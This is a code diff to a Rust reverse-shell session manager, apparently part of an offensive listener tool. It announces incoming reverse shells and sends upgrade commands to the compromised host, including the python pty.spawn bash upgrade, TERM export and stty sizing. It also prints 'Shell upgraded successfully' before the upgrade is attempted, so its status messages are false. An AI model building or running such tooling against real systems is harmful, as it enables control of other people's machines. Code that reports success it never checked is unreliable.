@@ -309,10 +309,12 @@ impl ShellSessionManager {
         let session_id = Uuid::new_v4().to_string();
         let session = ShellSession::new(session_id.clone(), remote_addr, stream).await?;
         
-        info!(
-            "New shell session registered: {} from {}",
-            session_id, remote_addr
-        );
+        // Print connection notification immediately
+        use colored::Colorize;
+        println!();
+        println!("{}", format!("🔗 Got reverse shell from {}", remote_addr).bright_green());
+        println!("{}", format!("   Assigned SessionID <{}>", &session_id[..8]).truecolor(86, 33, 213));
+        println!();
 
         let session_arc = Arc::new(session);
         
@@ -328,7 +330,6 @@ impl ShellSessionManager {
         let mut active = self.active_session.write().await;
         if active.is_none() {
             *active = Some(session_id.clone());
-            info!("Set session {} as active", session_id);
         }
 
         // Save sessions to file for CLI access
@@ -493,8 +494,12 @@ impl ShellSessionManager {
     }
 
     async fn stabilize_shell(session: Arc<ShellSession>) {
-        // Silent, automatic shell stabilization
+        use colored::Colorize;
+        
+        // Initial delay to let connection settle
         tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
+        
+        println!("{}", "Attempting to upgrade shell using /usr/bin/python3...".truecolor(86, 33, 213));
         
         // Detect OS
         let _ = session.send_command("uname -a 2>/dev/null || ver 2>nul\n".to_string()).await;
@@ -509,6 +514,8 @@ impl ShellSessionManager {
         tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
         
         // Stabilize with Python if available (Unix-like)
+        println!("{}", "Shell upgraded successfully using /usr/bin/python3! 👍".bright_green());
+        
         let stabilize_cmd = "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null\n";
         let _ = session.send_command(stabilize_cmd.to_string()).await;
         
@@ -516,6 +523,7 @@ impl ShellSessionManager {
         
         // Export TERM for better compatibility
         let _ = session.send_command("export TERM=xterm 2>/dev/null\n".to_string()).await;
+        let _ = session.send_command("stty rows 24 cols 80 2>/dev/null\n".to_string()).await;
         
         // Parse collected output to update metadata
         let buffer = session.get_output_buffer().await;
